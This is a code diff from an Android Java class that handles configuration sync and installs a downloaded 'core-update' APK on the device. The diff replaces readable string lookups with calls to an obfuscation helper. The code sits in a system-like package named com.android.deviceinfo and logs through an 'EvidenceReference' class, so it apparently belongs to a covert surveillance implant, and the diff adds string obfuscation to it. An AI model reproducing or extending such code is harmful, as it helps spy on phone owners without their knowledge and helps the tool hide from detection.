@@ -11,7 +11,6 @@ package com.android.deviceinfo.action.sync;
 
 import java.io.File;
 import java.io.IOException;
-import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Date;
 import java.util.List;
@@ -20,7 +19,6 @@ import java.util.Vector;
 import android.content.Intent;
 import android.net.Uri;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfType;
@@ -35,6 +33,7 @@ import com.android.deviceinfo.util.DataBuffer;
 import com.android.deviceinfo.util.DateTime;
 import com.android.deviceinfo.util.StringUtils;
 import com.android.deviceinfo.util.WChar;
+import com.android.m.M;
 
 
 /**
@@ -43,7 +42,7 @@ import com.android.deviceinfo.util.WChar;
 public abstract class Protocol implements iProtocol {
 
 	/** The Constant UPGRADE_FILENAME. */
-	public static final String UPGRADE_FILENAME = Messages.getString("5_0"); //$NON-NLS-1$
+	public static final String UPGRADE_FILENAME = M.d("core-update"); //$NON-NLS-1$
 	/** The debug. */
 	private static final String TAG = "Protocol"; //$NON-NLS-1$
 	private static Object configLock = new Object();
@@ -97,7 +96,7 @@ public abstract class Protocol implements iProtocol {
 		}
 
 		if (success) {
-			EvidenceReference.info(Messages.getString("5_1")); //$NON-NLS-1$
+			EvidenceReference.info(M.d("New configuration received")); //$NON-NLS-1$
 			return true;
 		} else {
 			return false;
@@ -159,7 +158,7 @@ public abstract class Protocol implements iProtocol {
 					Check.log(TAG + " (upgradeMulti): action " + fileName);
 				}
 				final Intent intent = new Intent(Intent.ACTION_VIEW);
-				intent.setDataAndType(Uri.fromFile(file), Messages.getString("5_2")); //$NON-NLS-1$
+				intent.setDataAndType(Uri.fromFile(file), M.d("application/vnd.android.package-archive")); //$NON-NLS-1$
 				intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 				Status.getAppContext().startActivity(intent);
 			} else {
